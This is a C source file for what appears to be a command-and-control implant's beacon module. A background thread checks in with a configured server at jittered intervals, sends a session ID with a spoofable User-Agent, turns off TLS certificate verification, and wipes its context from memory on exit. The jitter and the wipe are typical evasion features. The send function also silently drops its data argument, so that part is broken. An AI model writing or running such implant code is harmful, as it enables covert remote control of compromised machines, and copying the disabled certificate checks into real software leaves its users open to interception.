/**
 * @file beacon.c
 * @brief Async network beacon implementation
 */

#include "beacon.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#endif

#include <openssl/ssl.h>
#include <openssl/err.h>

/* Beacon context structure */
struct beacon_ctx {
    beacon_config_t config;
    
    /* Callbacks */
    beacon_callback_t on_connect;
    beacon_data_callback_t on_data;
    beacon_error_callback_t on_error;
    void *user_data;
    
    /* Connection state */
    int socket_fd;
    SSL_CTX *ssl_ctx;
    SSL *ssl;
    bool connected;
    bool running;
    
    /* Thread handle */
#ifdef _WIN32
    HANDLE thread;
#else
    pthread_t thread;
#endif
};

/* Forward declarations */
static void *beacon_loop(void *arg);
static int beacon_connect(beacon_ctx_t *ctx);
static int beacon_http_request(beacon_ctx_t *ctx, const uint8_t *data, size_t data_len);
static void beacon_disconnect(beacon_ctx_t *ctx);

beacon_ctx_t *beacon_init(const beacon_config_t *config) {
    if (!config) {
        return NULL;
    }
    
    beacon_ctx_t *ctx = (beacon_ctx_t *)calloc(1, sizeof(beacon_ctx_t));
    if (!ctx) {
        return NULL;
    }
    
    memcpy(&ctx->config, config, sizeof(beacon_config_t));
    ctx->socket_fd = -1;
    ctx->connected = false;
    ctx->running = false;
    
    /* Initialize OpenSSL */
    if (config->use_tls) {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
        
        ctx->ssl_ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx->ssl_ctx) {
            free(ctx);
            return NULL;
        }
        
        /* Set TLS 1.3 only */
        SSL_CTX_set_min_proto_version(ctx->ssl_ctx, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx->ssl_ctx, TLS1_3_VERSION);
        
        /* Disable certificate verification (for self-signed certs) */
        SSL_CTX_set_verify(ctx->ssl_ctx, SSL_VERIFY_NONE, NULL);
    }
    
#ifdef _WIN32
    /* Initialize Winsock */
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);
#endif
    
    return ctx;
}

int beacon_set_callbacks(
    beacon_ctx_t *ctx,
    beacon_callback_t on_connect,
    beacon_data_callback_t on_data,
    beacon_error_callback_t on_error,
    void *user_data
) {
    if (!ctx) {
        return -1;
    }
    
    ctx->on_connect = on_connect;
    ctx->on_data = on_data;
    ctx->on_error = on_error;
    ctx->user_data = user_data;
    
    return 0;
}

int beacon_start(beacon_ctx_t *ctx) {
    if (!ctx || ctx->running) {
        return -1;
    }
    
    ctx->running = true;
    
#ifdef _WIN32
    ctx->thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_loop, ctx, 0, NULL);
    if (!ctx->thread) {
        ctx->running = false;
        return -1;
    }
#else
    if (pthread_create(&ctx->thread, NULL, beacon_loop, ctx) != 0) {
        ctx->running = false;
        return -1;
    }
#endif
    
    return 0;
}

void beacon_stop(beacon_ctx_t *ctx) {
    if (!ctx) {
        return;
    }
    
    ctx->running = false;
    
#ifdef _WIN32
    if (ctx->thread) {
        WaitForSingleObject(ctx->thread, INFINITE);
        CloseHandle(ctx->thread);
        ctx->thread = NULL;
    }
#else
    pthread_join(ctx->thread, NULL);
#endif
}

void beacon_cleanup(beacon_ctx_t *ctx) {
    if (!ctx) {
        return;
    }
    
    beacon_stop(ctx);
    beacon_disconnect(ctx);
    
    if (ctx->ssl_ctx) {
        SSL_CTX_free(ctx->ssl_ctx);
    }
    
#ifdef _WIN32
    WSACleanup();
#endif
    
    /* Secure wipe */
    volatile uint8_t *ptr = (volatile uint8_t *)ctx;
    for (size_t i = 0; i < sizeof(beacon_ctx_t); i++) {
        ptr[i] = 0;
    }
    
    free(ctx);
}

bool beacon_is_connected(beacon_ctx_t *ctx) {
    return ctx && ctx->connected;
}

uint32_t beacon_calculate_jitter(uint32_t base_interval_ms, uint32_t jitter_percent) {
    if (jitter_percent > 100) {
        jitter_percent = 100;
    }
    
    /* Random jitter: base_interval ± (base_interval * jitter_percent / 100) */
    uint32_t max_jitter = (base_interval_ms * jitter_percent) / 100;
    uint32_t jitter = rand() % (max_jitter * 2 + 1) - max_jitter;
    
    return base_interval_ms + jitter;
}

/* Internal functions */

static void *beacon_loop(void *arg) {
    beacon_ctx_t *ctx = (beacon_ctx_t *)arg;
    
    srand((unsigned int)time(NULL));
    
    while (ctx->running) {
        /* Connect if not connected */
        if (!ctx->connected) {
            if (beacon_connect(ctx) == 0) {
                if (ctx->on_connect) {
                    ctx->on_connect(ctx, ctx->user_data);
                }
            } else {
                /* Retry after jittered interval */
                uint32_t retry_interval = beacon_calculate_jitter(ctx->config.interval_ms, ctx->config.jitter_percent);
#ifdef _WIN32
                Sleep(retry_interval);
#else
                usleep(retry_interval * 1000);
#endif
                continue;
            }
        }
        
        /* Send beacon */
        if (beacon_http_request(ctx, NULL, 0) != 0) {
            beacon_disconnect(ctx);
            continue;
        }
        
        /* Sleep with jitter */
        uint32_t sleep_interval = beacon_calculate_jitter(ctx->config.interval_ms, ctx->config.jitter_percent);
#ifdef _WIN32
        Sleep(sleep_interval);
#else
        usleep(sleep_interval * 1000);
#endif
    }
    
    return NULL;
}

static int beacon_connect(beacon_ctx_t *ctx) {
    struct sockaddr_in server_addr;
    
    /* Create socket */
    ctx->socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (ctx->socket_fd < 0) {
        if (ctx->on_error) {
            ctx->on_error(ctx, -1, "Failed to create socket", ctx->user_data);
        }
        return -1;
    }
    
    /* Set timeout */
    struct timeval timeout;
    timeout.tv_sec = ctx->config.timeout_ms / 1000;
    timeout.tv_usec = (ctx->config.timeout_ms % 1000) * 1000;
    setsockopt(ctx->socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));
    setsockopt(ctx->socket_fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));
    
    /* Connect to server */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(ctx->config.server_port);
    inet_pton(AF_INET, ctx->config.server_host, &server_addr.sin_addr);
    
    if (connect(ctx->socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        if (ctx->on_error) {
            ctx->on_error(ctx, -2, "Failed to connect to server", ctx->user_data);
        }
#ifdef _WIN32
        closesocket(ctx->socket_fd);
#else
        close(ctx->socket_fd);
#endif
        ctx->socket_fd = -1;
        return -1;
    }
    
    /* TLS handshake */
    if (ctx->config.use_tls) {
        ctx->ssl = SSL_new(ctx->ssl_ctx);
        if (!ctx->ssl) {
            if (ctx->on_error) {
                ctx->on_error(ctx, -3, "Failed to create SSL context", ctx->user_data);
            }
#ifdef _WIN32
            closesocket(ctx->socket_fd);
#else
            close(ctx->socket_fd);
#endif
            ctx->socket_fd = -1;
            return -1;
        }
        
        SSL_set_fd(ctx->ssl, ctx->socket_fd);
        
        if (SSL_connect(ctx->ssl) <= 0) {
            if (ctx->on_error) {
                ctx->on_error(ctx, -4, "TLS handshake failed", ctx->user_data);
            }
            SSL_free(ctx->ssl);
            ctx->ssl = NULL;
#ifdef _WIN32
            closesocket(ctx->socket_fd);
#else
            close(ctx->socket_fd);
#endif
            ctx->socket_fd = -1;
            return -1;
        }
    }
    
    ctx->connected = true;
    return 0;
}

static void beacon_disconnect(beacon_ctx_t *ctx) {
    if (ctx->ssl) {
        SSL_shutdown(ctx->ssl);
        SSL_free(ctx->ssl);
        ctx->ssl = NULL;
    }
    
    if (ctx->socket_fd >= 0) {
#ifdef _WIN32
        closesocket(ctx->socket_fd);
#else
        close(ctx->socket_fd);
#endif
        ctx->socket_fd = -1;
    }
    
    ctx->connected = false;
}

static int beacon_http_request(beacon_ctx_t *ctx, const uint8_t *data, size_t data_len) {
    /* Build HTTP GET request */
    char request[4096];
    snprintf(request, sizeof(request),
        "GET /beacon?id=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        ctx->config.session_id,
        ctx->config.server_host,
        ctx->config.user_agent
    );
    
    /* Send request */
    int bytes_sent;
    if (ctx->config.use_tls) {
        bytes_sent = SSL_write(ctx->ssl, request, strlen(request));
    } else {
        bytes_sent = send(ctx->socket_fd, request, strlen(request), 0);
    }
    
    if (bytes_sent <= 0) {
        if (ctx->on_error) {
            ctx->on_error(ctx, -5, "Failed to send request", ctx->user_data);
        }
        return -1;
    }
    
    /* Receive response */
    uint8_t response[65536];
    int bytes_received;
    if (ctx->config.use_tls) {
        bytes_received = SSL_read(ctx->ssl, response, sizeof(response) - 1);
    } else {
        bytes_received = recv(ctx->socket_fd, (char *)response, sizeof(response) - 1, 0);
    }
    
    if (bytes_received > 0) {
        response[bytes_received] = '\0';
        
        /* Call data callback */
        if (ctx->on_data) {
            ctx->on_data(ctx, response, bytes_received, ctx->user_data);
        }
    }
    
    return 0;
}

int beacon_send(beacon_ctx_t *ctx, const uint8_t *data, size_t data_len) {
    if (!ctx || !ctx->connected) {
        return -1;
    }
    
    return beacon_http_request(ctx, data, data_len);
}
